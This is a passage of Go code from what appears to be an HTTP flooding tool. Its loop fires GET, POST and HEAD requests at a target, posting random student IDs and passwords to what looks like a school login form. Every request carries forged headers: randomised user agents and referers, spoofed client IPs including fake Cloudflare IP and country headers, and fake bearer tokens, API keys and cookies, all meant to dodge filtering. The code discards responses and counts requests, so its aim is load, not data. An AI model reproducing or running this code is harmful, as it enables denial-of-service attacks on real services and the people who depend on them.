				stats.inc()
				time.Sleep(1 * time.Second)
				continue
			}

			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s", generateStudentNumber(), randomString(randInt(8, 16)))
				if randBool() {
					payload += "&remember=on"
				}
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}

			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")

			if randBool() {
				req.Header.Set("X-Forwarded-For", generateRandomIP())
				req.Header.Set("X-Real-IP", generateRandomIP())
			}

			if randInt(1, 100) <= 40 {
				cfIP := generateCloudflareIP()
				req.Header.Set("CF-Connecting-IP", cfIP)
				req.Header.Set("CF-IPCountry", []string{"US", "GB", "DE", "FR", "CA", "AU", "JP"}[randInt(0, 6)])
				req.Header.Set("True-Client-IP", cfIP)
			}

			numSecurity := randInt(1, 3)
			for i := 0; i < numSecurity; i++ {
				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
				for k, v := range secHeader {
					req.Header.Set(k, v)
				}
			}

			numModern := randInt(3, 6)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					req.Header.Set(k, v)
				}
			}

			if randInt(1, 100) <= 60 {
				numApp := randInt(1, 3)
				for i := 0; i < numApp; i++ {
					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
					for k, v := range appHeader {
						if v == "" {
							switch k {
							case "X-CSRF-Token", "X-API-Key":
								req.Header.Set(k, randomString(32))
							case "Authorization":
								req.Header.Set(k, "Bearer "+randomString(48))
							case "X-Device-ID", "X-Session-ID":
								req.Header.Set(k, randomString(32))
							}
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

			if randInt(1, 100) <= 70 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
